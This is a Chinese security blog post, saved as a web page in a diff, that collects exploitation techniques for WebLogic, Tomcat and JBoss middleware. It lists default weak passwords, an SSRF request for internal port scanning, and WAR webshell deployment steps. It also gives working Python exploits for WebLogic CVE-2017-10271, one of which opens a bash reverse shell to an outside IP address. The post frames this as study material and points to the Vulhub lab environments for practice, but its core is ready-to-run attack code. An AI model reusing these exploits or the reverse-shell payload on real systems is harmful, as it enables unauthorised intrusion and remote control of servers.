@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Walks个人博客(www.bywalks.com)关注网络安全、信息安全、网站建设、IT行业、网络安全文章、黑客技术、网络安全技术、网络安全知识、互联网安全知识、原创网络安全博客">
+    <meta name="keyword" content="Walks个人博客,关注网络安全,信息安全,网站建设,安全博客,web安全,网站漏洞,网络安全,网络安全技术,网络安全知识,网络安全教程">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          中间件漏洞(不定时更新) - Walks&#39;s Blog - Walks个人博客|网络安全爱好者
+        
+    </title>
+
+    <link rel="canonical" href="https://www.bywalks.com/2018/01/03/中间件漏洞(不定时更新)/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Walks个人博客</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/About.html">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.bywalks.com/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#网络安全" title="网络安全">网络安全</a>
+                        
+                          <a class="tag" href="/tags/#首页" title="首页">首页</a>
+                        
+                    </div>
+                    <h1>中间件漏洞(不定时更新)</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by Walks on
+                        2018-01-03
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>前言：</p>
+<p>一篇叙述中间件漏洞的文章，总结一下一些中间件的漏洞的利用。</p>
+<p>目录：</p>
+<p>0x01：渗透环境</p>
+<p>0x02：WebLogic</p>
+<p>0x03：Tomcat</p>
+<p>0x04：Jboss</p>
+<p><strong>0x01 渗透环境</strong></p>
+<p>在学习一个漏洞的时候，复现是必须要做的，毕竟看再多文章自己不复现下次遇到了这种漏洞还是不一定会有所印象，所以首先说的就是如何去找一些渗透环境。下面分为几种方法，这里只说下如何搭建Vulhub，其他的可以去官网看，都很详细。</p>
+<ul>
+<li><p>Vulhub，VulApps（基于Docker，只要几条命令）</p>
+</li>
+<li><p>ZoomEye，傻蛋（方便找一些实战环境）</p>
+</li>
+<li><p>Google，Bing（Google语法，Bing语法还是强大的）</p>
+</li>
+</ul>
+<p>Vulhub与VulApps</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Vulhub如何安装与使用</span><br><span class="line">安装</span><br><span class="line">apt install git docker.io docker-compose</span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">进入漏洞环境</span><br><span class="line"><span class="keyword">cd</span> vulhub/weblogic/ssrf/</span><br><span class="line"></span><br><span class="line">自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">启动整个环境</span><br><span class="line">docker-compose <span class="keyword">up</span> -d</span><br><span class="line"></span><br><span class="line">删除整个环境</span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line">VulApps想用的可以去GitHub看说明,两个项目地址放下面了</span><br><span class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/vulhub/vulhub</span><br><span class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/Medicean/VulApps</span><br></pre></td></tr></table></figure>
+<p><strong>0x02 WebLogic</strong></p>
+<ul>
+<li><p>弱口令  </p>
+</li>
+<li><p>SSRF</p>
+</li>
+<li><p>反序列化</p>
+</li>
+</ul>
+<p>弱口令</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">默认端口：<span class="number">7001</span></span><br><span class="line"></span><br><span class="line">默认后台：<span class="built_in">console</span>/login/loginForm.jsp</span><br><span class="line"></span><br><span class="line">弱口令：weblogic/weblogic</span><br><span class="line"></span><br><span class="line">部署war步骤：部署<span class="function"> -&gt;</span> 上传文件<span class="function"> -&gt;</span> 选择文件<span class="function"> -&gt;</span> 下一步<span class="function"> -&gt;</span> 下一步</span><br></pre></td></tr></table></figure>
+<p>SSRF  </p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CVE<span class="number">-2014</span><span class="number">-4241</span></span><br><span class="line"></span><br><span class="line">漏洞地址：uddiexplorer/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXP： </span><br><span class="line">GET <span class="meta-keyword">/uddiexplorer/</span>SearchPublicRegistries.jsp?rdoSearch=name<span class="variable">&amp;</span>txtSearchname=sdf<span class="variable">&amp;</span>txtSearchkey=<span class="variable">&amp;</span>txtSearchfor=<span class="variable">&amp;selfor</span>=Business+location<span class="variable">&amp;</span>btnSubmit=Search<span class="variable">&amp;operator</span>=http:<span class="comment">//127.0.0.1:7001 HTTP/1.1</span></span><br><span class="line"><span class="symbol">Host:</span> localhost</span><br><span class="line"><span class="symbol">Accept:</span> \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line"><span class="symbol">Connection:</span> close</span><br><span class="line"></span><br><span class="line">通过返回值的不同来判断内网端口是否开放</span><br></pre></td></tr></table></figure>
+<p>反序列化  </p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">CVE-<span class="number">2016</span>-<span class="number">0638</span>   </span><br><span class="line"></span><br><span class="line">命令：python2 Weblogic.py （用的时候修改下Main里面的IP和端口）</span><br><span class="line"></span><br><span class="line">CVE-<span class="number">2017</span>-<span class="number">3248</span>   weblogic\_cmd.jar</span><br><span class="line"></span><br><span class="line">命令：java -jar weblogic\_cmd.jar -C ls -H IP -P <span class="number">7001</span>  </span><br><span class="line"></span><br><span class="line">CVE-<span class="number">2017</span>-<span class="number">10271</span>(XMLDecode) </span><br><span class="line"></span><br><span class="line">漏洞地址:http://<span class="number">45.32</span><span class="number">.80</span><span class="number">.225</span>:<span class="number">7001</span>/wls-wsat/CoordinatorPortType11(若地址存在则漏洞存在)</span><br><span class="line"></span><br><span class="line">EXP  WriteTxt:</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">headers = &#123; 'Content-type': 'text/xml' &#125;</span><br><span class="line">data = '''&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;&lt;java&gt;&lt;java version=<span class="string">"1.4.0"</span> class=<span class="string">"java.beans.XMLDecoder"</span>&gt;&lt;object class=<span class="string">"java.io.PrintWriter"</span>&gt;&lt;<span class="built_in">string</span>&gt;servers/AdminServer/tmp/\_WL\_internal/bea\_wls\_internal/9j4dqk/war/bywalks.txt&lt;/<span class="built_in">string</span>&gt;&lt;void <span class="built_in">method</span>=<span class="string">"println"</span>&gt;&lt;<span class="built_in">string</span>&gt;Weblogic\_Test&lt;/<span class="built_in">string</span>&gt;&lt;/void&gt;&lt;void <span class="built_in">method</span>=<span class="string">"close"</span>/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;'''</span><br><span class="line">def <span class="built_in">exp</span>(ip):</span><br><span class="line">    ip = ip.strip(<span class="string">"\\n"</span>)</span><br><span class="line">    url\_post = ip + <span class="string">"/wls-wsat/CoordinatorPortType11"</span></span><br><span class="line">    url\_myfile = ip + <span class="string">"/bea\_wls\_internal/bywalks.txt"</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Test for "</span> + ip + <span class="string">"....."</span>)</span><br><span class="line">    r = requests.post(url=url\_post,data=data,headers=headers)</span><br><span class="line">    r2 = requests.<span class="built_in">get</span>(url\_myfile)</span><br><span class="line">    <span class="keyword">if</span> r2.<span class="built_in">status</span>\_code != <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Weblogic Vulnerable!!!"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"You file path is "</span> + url\_myfile)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"No Vulnerable!!!"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"================================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \<span class="symbol">_</span>\_name\<span class="symbol">_</span>\<span class="symbol">_</span> == '\<span class="symbol">_</span>\_main\<span class="symbol">_</span>\<span class="symbol">_</span>':</span><br><span class="line">    Weblogic\_IP\_list = \[\]</span><br><span class="line">    with open(<span class="string">"weblogic.txt"</span>) as f:</span><br><span class="line">        Weblogic\_IP\_list = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> Weblogic\_IP\_list:</span><br><span class="line">        try:</span><br><span class="line">            <span class="built_in">exp</span>(ip)</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXP  ReturnShell:</span><br><span class="line">import requests</span><br><span class="line">headers = &#123; 'Content-type': 'text/xml' &#125;</span><br><span class="line">data = '''</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;java version=<span class="string">"1.8.0\_131"</span> class=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span><br><span class="line">  &lt;void class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">&lt;<span class="built_in">array</span> class=<span class="string">"java.lang.String"</span> <span class="built_in">length</span>=<span class="string">"3"</span>&gt;</span><br><span class="line">  &lt;void index=<span class="string">"0"</span>&gt;</span><br><span class="line">&lt;<span class="built_in">string</span>&gt;/bin/bash&lt;/<span class="built_in">string</span>&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"1"</span>&gt;</span><br><span class="line">&lt;<span class="built_in">string</span>&gt;-c&lt;/<span class="built_in">string</span>&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"2"</span>&gt;</span><br><span class="line">&lt;<span class="built_in">string</span>&gt;bash -i &gt;&amp; /dev/tcp/<span class="number">113.75</span><span class="number">.162</span><span class="number">.62</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>&lt;/<span class="built_in">string</span>&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/<span class="built_in">array</span>&gt;</span><br><span class="line">  &lt;void <span class="built_in">method</span>=<span class="string">"start"</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">  &lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;'''</span><br><span class="line">def <span class="built_in">exp</span>(ip):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Test for "</span> + ip + <span class="string">" ....."</span>)</span><br><span class="line">    r = requests.post(url=ip,data=data,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r.<span class="built_in">status</span>\_code)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \<span class="symbol">_</span>\_name\<span class="symbol">_</span>\<span class="symbol">_</span> == '\<span class="symbol">_</span>\_main\<span class="symbol">_</span>\<span class="symbol">_</span>':</span><br><span class="line">    ip = <span class="string">"http://45.32.80.225:7001/wls-wsat/CoordinatorPortType11"</span></span><br><span class="line">    try:</span><br><span class="line">        <span class="built_in">exp</span>(ip)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+<p><strong>0x03 Tomcat</strong></p>
+<ul>
+<li><p>弱口令</p>
+</li>
+<li><p>PUT上传</p>
+</li>
+</ul>
+<p>弱口令</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">默认端口：<span class="number">8080</span></span><br><span class="line"></span><br><span class="line">默认地址：manager/html</span><br><span class="line"></span><br><span class="line">生成war命令(到shell的文件夹下)：jar -cvf shell.war ./    </span><br><span class="line"></span><br><span class="line">部署<span class="function"><span class="title">war</span>步骤：选择文件 -&gt;</span> D<span class="function"><span class="title">eploy</span> -&gt;</span> 完成</span><br></pre></td></tr></table></figure>
+<p>PUT上传  </p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本博客里面有<span class="built_in">EXP</span></span><br></pre></td></tr></table></figure>
+<p><strong>0x04 Jboss</strong>  </p>
+<ul>
+<li><p>部署WAR</p>
+</li>
+<li><p>反序列化</p>
+</li>
+</ul>
+<p>部署WAR</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认端口：<span class="number">8080</span></span><br><span class="line"></span><br><span class="line">默认后台：jmx-<span class="built_in">console</span></span><br><span class="line"></span><br><span class="line">部署步骤：Jboss.deployment包下的flavor=URL.type=DeploymentSccanner<span class="function"> -&gt;</span> Add Url<span class="function"><span class="params">()</span> -&gt;</span> 远程上传<span class="function"> -&gt;</span> deploy<span class="function"><span class="params">()</span> -&gt;</span> 访问即可</span><br></pre></td></tr></table></figure>
+<p>反序列化</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE<span class="number">-2015</span><span class="number">-8103</span>   DeserializeExploit.jar</span><br><span class="line"></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-12149</span>  Jboss.jar</span><br></pre></td></tr></table></figure>
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/01/04/文件上传漏洞（个人总结）/" data-toggle="tooltip" data-placement="top" title="文件上传漏洞（个人总结）">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/12/20/浅谈XXE漏洞/" data-toggle="tooltip" data-placement="top" title="浅谈XXE漏洞">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#网络安全" title="网络安全">网络安全</a>
+                        
+                          <a class="tag" href="/tags/#首页" title="首页">首页</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://www.bugsafe.cn/" target="_blank">Poacher&#39;s Blog</a></li>
+                    
+                        <li><a href="http://www.ttk7.cn/" target="_blank">天堂空气</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "hexo-theme-huxblog";
+    var disqus_identifier = "https://www.bywalks.com/2018/01/03/中间件漏洞(不定时更新)/";
+    var disqus_url = "https://www.bywalks.com/2018/01/03/中间件漏洞(不定时更新)/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Walks个人博客 2020 
+                    <br>
+                    Theme by Hux 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.bywalks.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-49627206-1';
+    var _gaDomain = 'bywalks.com';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '4cc1f2d8f3067386cc5cdb626a202900';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.bywalks.com/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
